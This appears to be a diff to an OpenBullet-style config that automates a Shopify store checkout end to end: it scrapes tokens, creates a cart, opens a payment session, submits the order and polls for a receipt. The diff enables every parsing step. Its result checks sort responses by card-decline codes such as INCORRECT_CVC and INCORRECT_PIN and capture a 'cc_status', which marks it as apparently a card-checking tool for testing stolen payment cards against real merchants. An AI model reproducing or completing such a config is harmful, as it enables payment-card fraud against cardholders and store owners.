@@ -85,15 +85,9 @@ REQUEST GET "https://<site>/products.json"
   HEADER "Pragma: no-cache" 
 
 # Parse product_id and price from products.json
-#variantid PARSE "<SOURCE>" LR "\"variants\":[{\"id\":" "," CreateEmpty=FALSE -> VAR "variantid" 
+variantid PARSE "<SOURCE>" LR "\"variants\":[{\"id\":" "," CreateEmpty=FALSE -> VAR "variantid" 
 
-#price PARSE "<SOURCE>" LR "\"price\":\"" "\"," CreateEmpty=FALSE -> VAR "price" 
-
-#products PARSE "<SOURCE>" LR "\"products\":[" "]" CreateEmpty=FALSE -> VAR "products" 
-
-#variantid PARSE "<products>" LR "\"id\":" "," CreateEmpty=FALSE -> VAR "variantid" 
-
-#price PARSE "<products>" LR "\"price\":\"" "\"," CreateEmpty=FALSE -> VAR "price" 
+price PARSE "<SOURCE>" LR "\"price\":\"" "\"," CreateEmpty=FALSE -> VAR "price" 
 
 # Step 2: Get site homepage to extract accessToken
 REQUEST GET "https://<site>" 
@@ -103,7 +97,7 @@ REQUEST GET "https://<site>"
   HEADER "Accept-Language: en-US,en;q=0.9" 
   HEADER "Pragma: no-cache" 
 
-#site_key PARSE "<SOURCE>" LR "\"accessToken\":\"" "\"" CreateEmpty=FALSE -> VAR "site_key" 
+site_key PARSE "<SOURCE>" LR "\"accessToken\":\"" "\"" CreateEmpty=FALSE -> VAR "site_key" 
 
 # Step 3: Create cart via GraphQL
 REQUEST POST "https://<site>/api/unstable/graphql.json?operation_name=cartCreate" 
@@ -125,7 +119,7 @@ REQUEST POST "https://<site>/api/unstable/graphql.json?operation_name=cartCreate
   HEADER "X-Start-Wallet-Checkout: true" 
   HEADER "X-Wallet-Name: MoreOptions" 
 
-#checkout_url PARSE "<SOURCE>" LR "\"checkoutUrl\":\"" "\"" CreateEmpty=FALSE -> VAR "checkout_url" 
+checkout_url PARSE "<SOURCE>" LR "\"checkoutUrl\":\"" "\"" CreateEmpty=FALSE -> VAR "checkout_url" 
 
 # Step 4: Get checkout page
 REQUEST GET "<checkout_url>?auto_redirect=false" 
@@ -144,27 +138,27 @@ REQUEST GET "<checkout_url>?auto_redirect=false"
   HEADER "Pragma: no-cache" 
 
 # Extract tokens from checkout page
-#paymentMethodIdentifier PARSE "<SOURCE>" LR "paymentMethodIdentifier&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "payment_idf" 
+paymentMethodIdentifier PARSE "<SOURCE>" LR "paymentMethodIdentifier&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "payment_idf" 
 
-#stable_id PARSE "<SOURCE>" LR "stableId&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "stable_id" 
+stable_id PARSE "<SOURCE>" LR "stableId&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "stable_id" 
 
-#queue_token PARSE "<SOURCE>" LR "queueToken&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "queue_token" 
+queue_token PARSE "<SOURCE>" LR "queueToken&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "queue_token" 
 
-#currency_code PARSE "<SOURCE>" LR "currencyCode&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "currency_code" 
+currency_code PARSE "<SOURCE>" LR "currencyCode&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "currency_code" 
 
-#country_code PARSE "<SOURCE>" LR "countryCode&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "country_code" 
+country_code PARSE "<SOURCE>" LR "countryCode&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "country_code" 
 
-#x_check PARSE "<SOURCE>" LR "serialized-session-token\" content=\"&quot;" "&quot;\"" CreateEmpty=FALSE -> VAR "x_check" 
+x_check PARSE "<SOURCE>" LR "serialized-session-token\" content=\"&quot;" "&quot;\"" CreateEmpty=FALSE -> VAR "x_check" 
 
-#tok PARSE "<SOURCE>" LR "serialized-source-token\" content=\"&quot;" "&quot;\"" CreateEmpty=FALSE -> VAR "tok" 
+tok PARSE "<SOURCE>" LR "serialized-source-token\" content=\"&quot;" "&quot;\"" CreateEmpty=FALSE -> VAR "tok" 
 
-#web_build PARSE "<SOURCE>" LR "\"sha\":\"" "\"" CreateEmpty=FALSE -> VAR "web_build" 
+web_build PARSE "<SOURCE>" LR "\"sha\":\"" "\"" CreateEmpty=FALSE -> VAR "web_build" 
 
-#tax1 PARSE "<SOURCE>" LR "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;" "&quot" CreateEmpty=FALSE -> VAR "tax1" 
+tax1 PARSE "<SOURCE>" LR "totalTaxAndDutyAmount&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;" "&quot" CreateEmpty=FALSE -> VAR "tax1" 
 
-#gateway PARSE "<SOURCE>" LR "extensibilityDisplayName&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "gateway" 
+gateway PARSE "<SOURCE>" LR "extensibilityDisplayName&quot;:&quot;" "&quot;" CreateEmpty=FALSE -> VAR "gateway" 
 
-#DMT PARSE "<SOURCE>" LR "deliveryMethodTypes&quot;:[&quot;" "&quot;],&quot;" CreateEmpty=FALSE -> VAR "DMT" 
+DMT PARSE "<SOURCE>" LR "deliveryMethodTypes&quot;:[&quot;" "&quot;],&quot;" CreateEmpty=FALSE -> VAR "DMT" 
 
 # Step 5: Create payment session
 REQUEST POST "https://checkout.pci.shopifyinc.com/sessions" 
@@ -184,7 +178,7 @@ REQUEST POST "https://checkout.pci.shopifyinc.com/sessions"
   HEADER "Sec-Fetch-Site: same-origin" 
   HEADER "Pragma: no-cache" 
 
-#id PARSE "<SOURCE>" LR "{\"id\":\"" "\"}" CreateEmpty=FALSE -> VAR "id" 
+id PARSE "<SOURCE>" LR "{\"id\":\"" "\"}" CreateEmpty=FALSE -> VAR "id" 
 
 # Step 6: First Proposal (Negotiate)
 REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=Proposal" 
@@ -211,13 +205,13 @@ REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=Proposal"
   HEADER "X-Checkout-Web-Source-Id: <tok>" 
   HEADER "Pragma: no-cache" 
 
-#tax2 PARSE "<SOURCE>" LR "\"totalTaxAndDutyAmount\":{\"value\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "tax2" 
+tax2 PARSE "<SOURCE>" LR "\"totalTaxAndDutyAmount\":{\"value\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "tax2" 
 
-#handle PARSE "<SOURCE>" LR "\"handle\":\"" "\"" CreateEmpty=FALSE -> VAR "handle" 
+handle PARSE "<SOURCE>" LR "\"handle\":\"" "\"" CreateEmpty=FALSE -> VAR "handle" 
 
-#amount PARSE "<SOURCE>" LR "\"amount\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "amount" 
+amount PARSE "<SOURCE>" LR "\"amount\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "amount" 
 
-#total PARSE "<SOURCE>" LR "\"checkoutTotal\":{\"value\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "total" 
+total PARSE "<SOURCE>" LR "\"checkoutTotal\":{\"value\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "total" 
 
 # Step 7: Second Proposal (Negotiate) - Same as first but with updated deliveryMethodTypes
 REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=Proposal" 
@@ -244,7 +238,7 @@ REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=Proposal"
   HEADER "X-Checkout-Web-Source-Id: <tok>" 
   HEADER "Pragma: no-cache" 
 
-#tax3 PARSE "<SOURCE>" LR "\"totalTaxAndDutyAmount\":{\"value\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "tax3" 
+tax3 PARSE "<SOURCE>" LR "\"totalTaxAndDutyAmount\":{\"value\":{\"amount\":\"" "\"" CreateEmpty=FALSE -> VAR "tax3" 
 
 # Step 8: Submit for Completion
 REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=SubmitForCompletion" 
@@ -271,7 +265,7 @@ REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=SubmitForC
   HEADER "X-Checkout-Web-Source-Id: <tok>" 
   HEADER "Pragma: no-cache" 
 
-#bill PARSE "<SOURCE>" LR "\"receipt\":{\"id\":\"" "\"," CreateEmpty=FALSE -> VAR "bill" 
+bill PARSE "<SOURCE>" LR "\"receipt\":{\"id\":\"" "\"," CreateEmpty=FALSE -> VAR "bill" 
 
 # Step 9: Poll for Receipt
 REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=PollForReceipt" 
@@ -297,19 +291,19 @@ REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=PollForRec
   HEADER "X-Checkout-Web-Source-Id: <tok>" 
   HEADER "Pragma: no-cache" 
 
-#raw PARSE "<SOURCE>" LR "" "" -> VAR "raw" 
+raw PARSE "<SOURCE>" LR "" "" -> VAR "raw" 
 
-#cc_status PARSE "<SOURCE>" LR "\"code\":\"" "\"," CreateEmpty=FALSE -> CAP "cc_status" 
+cc_status PARSE "<SOURCE>" LR "\"code\":\"" "\"," CreateEmpty=FALSE -> CAP "cc_status" 
 
-#cc_status2 PARSE "<SOURCE>" LR "\"__typename\":\"" "\"}" CreateEmpty=FALSE -> CAP "cc_status2" 
+cc_status2 PARSE "<SOURCE>" LR "\"__typename\":\"" "\"}" CreateEmpty=FALSE -> CAP "cc_status2" 
 
-#cc_status3 PARSE "<SOURCE>" LR "\"__typename\":\"" "\"}," CreateEmpty=FALSE -> CAP "cc_status3" 
+cc_status3 PARSE "<SOURCE>" LR "\"__typename\":\"" "\"}," CreateEmpty=FALSE -> CAP "cc_status3" 
 
-#cc_status4 PARSE "<SOURCE>" LR "\"confirmationPage\":{\"url\":\"" "\",\"shouldRedirect\"" CreateEmpty=FALSE -> VAR "cc_status4" 
+cc_status4 PARSE "<SOURCE>" LR "\"confirmationPage\":{\"url\":\"" "\",\"shouldRedirect\"" CreateEmpty=FALSE -> VAR "cc_status4" 
 
-#cc_status5 PARSE "<SOURCE>" LR "\"url\":\"" "\",\"" CreateEmpty=FALSE -> CAP "cc_status5" 
+cc_status5 PARSE "<SOURCE>" LR "\"url\":\"" "\",\"" CreateEmpty=FALSE -> CAP "cc_status5" 
 
-#cc_status6 PARSE "<SOURCE>" LR "\"checkoutCompletionTarget\":\"" "\"" CreateEmpty=FALSE -> VAR "cc_status6" 
+cc_status6 PARSE "<SOURCE>" LR "\"checkoutCompletionTarget\":\"" "\"" CreateEmpty=FALSE -> VAR "cc_status6" 
 
 KEYCHECK BanOnToCheck=FALSE 
   KEYCHAIN Failure OR 
@@ -396,4 +390,4 @@ KEYCHECK BanOnToCheck=FALSE
     KEY "<cc_status>" Contains "INCORRECT_PIN" 
     KEY "<cc_status>" Contains "INCORRECT_CVC" 
 
-#Gateway FUNCTION Constant "Shopify Normal" -> CAP "Gateway" 
+Gateway FUNCTION Constant "Shopify Normal" -> CAP "Gateway" 
